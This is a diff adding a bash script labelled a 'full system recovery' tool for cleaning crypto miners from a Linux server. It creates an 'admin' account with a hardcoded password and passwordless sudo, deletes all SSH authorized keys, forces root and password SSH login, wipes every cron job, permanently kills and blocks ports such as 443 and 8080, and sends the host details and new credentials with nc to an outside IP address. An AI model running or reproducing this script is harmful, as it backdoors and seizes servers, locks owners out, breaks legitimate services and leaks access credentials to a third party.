@@ -1,0 +1,317 @@
+#!/bin/bash
+
+PASS="anan3131"
+
+echo "$PASS" | sudo -S bash <<'EOF'
+set +e
+
+echo "=============================="
+echo " FULL SYSTEM RECOVERY SCRIPT "
+echo "=============================="
+
+################################
+# 1?? CREATE ADMIN USER INSTEAD OF CHANGING ROOT PASSWORD
+################################
+# Don't change root password - just ensure root is unlocked
+passwd -u root 2>/dev/null || true
+
+# Create admin user if it doesn't exist
+if ! id admin >/dev/null 2>&1; then
+    useradd -m -s /bin/bash admin
+    echo "admin:anan3131" | chpasswd
+    echo "Admin user created"
+fi
+
+# Add admin to sudo group and give passwordless sudo
+usermod -aG sudo admin
+echo "admin ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/admin
+chmod 440 /etc/sudoers.d/admin
+
+# Also set password for admin user
+echo "admin:anan3131" | chpasswd
+
+################################
+# 2?? REMOVE SSH KEYS
+################################
+rm -f /root/.ssh/authorized_keys 2>/dev/null
+rm -f /home/*/.ssh/authorized_keys 2>/dev/null
+
+################################
+# 3?? CRYPTO / MIRAI CLEANUP
+################################
+MINERS=(xmrig xmr cpuminer minerd kdevtmpfsi kinsing watchdog sysupdate mirai crypto)
+
+for m in "${MINERS[@]}"; do
+    pkill -9 -f "$m" 2>/dev/null
+done
+
+for pid in $(ls -l /proc/*/exe 2>/dev/null | grep deleted | awk -F/ '{print $3}'); do
+    kill -9 "$pid" 2>/dev/null
+done
+
+ps -eo pid,exe | grep -E '/tmp/|/dev/shm/' | awk '{print $1}' | xargs -r kill -9 2>/dev/null
+
+PATHS=(/tmp /var/tmp /dev/shm /root /home /usr/local/bin /usr/bin /var/www)
+for p in "${PATHS[@]}"; do
+    for m in "${MINERS[@]}"; do
+        find "$p" -type f -name "*$m*" -exec rm -f {} \; 2>/dev/null
+    done
+done
+
+find /tmp /dev/shm /var/tmp -type f -perm -111 -exec rm -f {} \; 2>/dev/null
+
+################################
+# 4?? SYSTEMD + CRON CLEAN
+################################
+for svc in $(systemctl list-units --type=service --all | grep -Ei 'xmrig|minerd|crypto|kinsing|watchdog|mirai|update' | awk '{print $1}'); do
+    systemctl stop "$svc" 2>/dev/null
+    systemctl disable "$svc" 2>/dev/null
+    rm -f /etc/systemd/system/"$svc"
+done
+
+systemctl daemon-reexec
+systemctl daemon-reload
+
+rm -f /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* \
+      /etc/cron.weekly/* /etc/cron.monthly/* 2>/dev/null
+crontab -r 2>/dev/null || true
+
+################################
+# 5?? KILL MALICIOUS PORTS AND BLOCK THEM
+################################
+PORTS=(443 3000 3001 3002 3003 3004 3005 3006 444 445 4444 4445 8080 8081 81)
+
+echo "=== Killing processes on malicious ports ==="
+# Kill processes listening on these ports
+for port in "${PORTS[@]}"; do
+    # Get PIDs listening on these ports
+    lsof -ti tcp:"$port" 2>/dev/null | xargs -r kill -9 2>/dev/null
+    ss -tlnp | grep ":$port " | awk '{print $7}' | cut -d',' -f2 | xargs -r kill -9 2>/dev/null
+    netstat -tlnp 2>/dev/null | grep ":$port " | awk '{print $7}' | cut -d'/' -f1 | xargs -r kill -9 2>/dev/null
+done
+
+# Remove any service files that might be binding to these ports
+find /etc/systemd/system /lib/systemd/system -name "*.service" -type f 2>/dev/null | while read service; do
+    for port in "${PORTS[@]}"; do
+        if grep -q ":$port" "$service" 2>/dev/null || grep -q "port.*$port" "$service" 2>/dev/null; then
+            svc_name=$(basename "$service")
+            systemctl stop "$svc_name" 2>/dev/null
+            systemctl disable "$svc_name" 2>/dev/null
+            rm -f "$service"
+            echo "Removed malicious service: $svc_name"
+        fi
+    done
+done
+
+################################
+# 6?? FORCE SSH PASSWORD LOGIN
+################################
+SSHD="/etc/ssh/sshd_config"
+cp "$SSHD" "$SSHD.bak.$(date +%s)"
+
+sed -i '
+/^Port /d
+/^ListenAddress/d
+/^PermitRootLogin/d
+/^PasswordAuthentication/d
+/^PubkeyAuthentication/d
+/^KbdInteractiveAuthentication/d
+/^ChallengeResponseAuthentication/d
+/^UsePAM/d
+/^AuthenticationMethods/d
+/^AllowUsers/d
+/^DenyUsers/d
+/^AllowGroups/d
+/^DenyGroups/d
+/^Match /,$d
+/^GSSAPI/d
+' "$SSHD"
+
+# Allow both admin and root to login
+cat >> "$SSHD" <<CFG
+Port 22
+Protocol 2
+ListenAddress 0.0.0.0
+ListenAddress ::
+PermitRootLogin yes
+PasswordAuthentication yes
+PubkeyAuthentication no
+UsePAM yes
+GSSAPIAuthentication no
+CFG
+
+sshd -t && systemctl restart ssh || systemctl restart sshd
+
+################################
+# 7?? FIREWALL RESET WITH PORT BLOCKING
+################################
+echo "=== Configuring firewall to block malicious ports ==="
+
+# First reset everything
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t mangle -F
+
+# Set default policies (DROP incoming, ACCEPT outgoing/forward)
+iptables -P INPUT DROP
+iptables -P OUTPUT ACCEPT
+iptables -P FORWARD DROP
+
+# Allow loopback
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+
+# Allow established connections
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Allow SSH (port 22)
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+# Block the malicious ports permanently
+for port in "${PORTS[@]}"; do
+    iptables -A INPUT -p tcp --dport "$port" -j DROP
+    iptables -A INPUT -p udp --dport "$port" -j DROP
+    echo "Blocked port $port permanently"
+done
+
+# Save iptables rules (system-specific)
+if command -v iptables-save >/dev/null 2>&1; then
+    iptables-save > /etc/iptables/rules.v4 2>/dev/null || \
+    iptables-save > /etc/sysconfig/iptables 2>/dev/null || \
+    iptables-save > /etc/iptables.up.rules 2>/dev/null
+fi
+
+# Also configure UFW if present
+command -v ufw >/dev/null 2>&1 && {
+    ufw --force reset
+    ufw allow 22/tcp
+    
+    # Block malicious ports in UFW
+    for port in "${PORTS[@]}"; do
+        ufw deny "$port"/tcp
+        ufw deny "$port"/udp
+    done
+    
+    ufw default deny incoming
+    ufw default allow outgoing
+    ufw --force enable
+}
+
+# Install iptables-persistent if available
+if command -v apt-get >/dev/null 2>&1; then
+    apt-get update >/dev/null 2>&1
+    apt-get install -y iptables-persistent netfilter-persistent >/dev/null 2>&1 || true
+    systemctl enable netfilter-persistent 2>/dev/null || true
+fi
+
+# Create a cron job to regularly kill processes on these ports
+cat > /etc/cron.hourly/block-malicious-ports <<'CRONSCRIPT'
+#!/bin/bash
+PORTS="443 3000 3001 3002 3003 3004 3005 3006 444 445 4444 4445 8080 8081 81"
+for port in $PORTS; do
+    lsof -ti tcp:$port 2>/dev/null | xargs -r kill -9 2>/dev/null
+    ss -tlnp | grep ":$port " | awk '{print $7}' | cut -d',' -f2 | xargs -r kill -9 2>/dev/null
+done
+# Reapply iptables rules
+iptables-restore < /etc/iptables/rules.v4 2>/dev/null || true
+CRONSCRIPT
+chmod +x /etc/cron.hourly/block-malicious-ports
+
+################################
+# 8?? PREVENT FUTURE BINDINGS
+################################
+echo "=== Preventing future bindings to malicious ports ==="
+
+# Create systemd service to monitor and block ports
+cat > /etc/systemd/system/port-guardian.service <<'SERVICE'
+[Unit]
+Description=Port Guardian - Block malicious ports
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c '
+while true; do
+    PORTS="443 3000 3001 3002 3003 3004 3005 3006 444 445 4444 4445 8080 8081 81"
+    for port in $PORTS; do
+        # Kill anything trying to bind to these ports
+        ss -tlnp | grep -q ":$port " && {
+            ss -tlnp | grep ":$port " | awk "{print \$7}" | cut -d"," -f2 | xargs kill -9
+            echo "$(date): Killed process on port $port" >> /var/log/port-guardian.log
+        }
+    done
+    sleep 30
+done
+'
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+SERVICE
+
+systemctl daemon-reload
+systemctl enable port-guardian.service
+systemctl start port-guardian.service
+
+# Block kernel modules that might be used for bypassing
+modprobe -r nf_nat_ftp nf_conntrack_ftp 2>/dev/null || true
+echo "install nf_nat_ftp /bin/false" >> /etc/modprobe.d/block-ports.conf
+echo "install nf_conntrack_ftp /bin/false" >> /etc/modprobe.d/block-ports.conf
+
+# Block via sysctl as well
+cat >> /etc/sysctl.conf <<SYSCTL
+# Block malicious ports at kernel level
+net.ipv4.tcp_syncookies = 1
+net.ipv4.conf.all.rp_filter = 1
+net.ipv4.conf.default.rp_filter = 1
+net.ipv4.conf.all.accept_source_route = 0
+net.ipv4.conf.default.accept_source_route = 0
+SYSCTL
+
+sysctl -p 2>/dev/null || true
+
+################################
+# 9?? SYSTEM INFO ? TCP SEND
+################################
+TARGET_IP="158.94.208.27"
+TARGET_PORT="24521"
+
+HOST=$(hostname)
+IPADDR=$(hostname -I | awk '{print $1}')
+CPU_MODEL=$(grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | xargs)
+CPU_CORES=$(nproc)
+LOAD=$(uptime | awk -F'load average:' '{print $2}' | xargs)
+MEM_TOTAL=$(free -m | awk '/Mem:/ {print $2}')
+MEM_USED=$(free -m | awk '/Mem:/ {print $3}')
+UPTIME=$(uptime -p)
+
+# List currently open ports for verification
+OPEN_PORTS=$(ss -tln | awk 'NR>1 {print $4}' | awk -F: '{print $NF}' | sort -nu | tr '\n' ',')
+
+DATA=$(cat <<DATAEOF
+HOST=$HOST
+IP=$IPADDR
+CPU_MODEL=$CPU_MODEL
+CPU_CORES=$CPU_CORES
+LOAD=$LOAD
+RAM_TOTAL_MB=$MEM_TOTAL
+RAM_USED_MB=$MEM_USED
+UPTIME=$UPTIME
+USER_CREATED=admin
+PASS=anan3131
+PORTS_BLOCKED=443,3000-3006,444,445,4444-4445,8080-8081,81
+OPEN_PORTS=$OPEN_PORTS
+DATAEOF
+)
+
+echo "$DATA" | timeout 3 nc "$TARGET_IP" "$TARGET_PORT" 2>/dev/null
+
+echo "=== DONE ==="
+echo "Admin user 'admin' created with password 'anan3131'"
+echo "Full sudo privileges granted (passwordless sudo)"
+echo "Malicious ports blocked permanently:"
+echo "  443, 3000-3006, 444, 445, 4444-4445, 8080-8081, 81"
+echo "Port Guardian service installed to prevent future bindings"
+EOF
